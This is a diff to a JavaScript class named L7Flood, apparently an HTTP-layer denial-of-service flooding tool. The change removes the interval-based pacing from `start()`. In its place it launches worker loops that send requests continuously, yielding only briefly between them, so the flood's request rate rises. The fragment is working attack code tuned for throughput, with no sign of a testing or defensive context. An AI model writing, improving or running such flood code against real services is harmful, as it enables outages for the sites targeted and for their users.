@@ -342,18 +342,24 @@ class L7Flood {
         }
     }
 
+    async runWorker() {
+        while (this.running) {
+            await this.sendRequest();
+            // Yield to the event loop briefly to prevent blocking,
+            // but immediately schedule the next request.
+            await new Promise(resolve => setImmediate(resolve));
+        }
+    }
+
     start() {
-        this.floodInterval = setInterval(() => {
-            for (let i = 0; i < this.threadCount; i++) {
-                this.sendRequest(); // Fire and forget
-            }
-        }, this.delay);
+        this.running = true;
+        for (let i = 0; i < this.threadCount; i++) {
+            this.runWorker(); // Launch each worker, don't await
+        }
     }
 
     stop() {
-        if (this.floodInterval) {
-            clearInterval(this.floodInterval);
-        }
+        this.running = false;
     }
 }
 
